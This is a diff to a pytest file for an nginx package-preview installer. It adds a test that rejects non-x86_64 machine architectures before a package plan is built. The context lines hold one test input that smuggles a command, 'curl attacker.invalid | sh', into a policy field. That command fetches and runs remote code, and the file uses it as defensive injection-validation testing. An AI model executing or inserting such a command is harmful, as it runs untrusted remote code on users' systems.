@@ -72,6 +72,17 @@ def test_unsupported_platform_fails_before_package_plan(release, python):
                                document=document())
 
 
+@pytest.mark.parametrize("machine", ["aarch64", "ppc64le", "s390x", "i686", "amd64", ""])
+def test_unsupported_machine_refused_before_native_package_plan(monkeypatch, machine):
+    import platform
+    monkeypatch.setattr(platform, "machine", lambda: machine)
+    for release, python in (("ID=debian\nVERSION_ID=13\n", (3, 13)),
+                            ("ID=almalinux\nVERSION_ID=10\n", (3, 12))):
+        with pytest.raises(InstallInputError, match="only x86_64"):
+            preview_nginx_packages(os_release=release, python_version=python,
+                                   document=document())
+
+
 @pytest.mark.parametrize("field,value", [
     ("policy", "auto"),
     ("policy", "nginx; curl attacker.invalid | sh"),
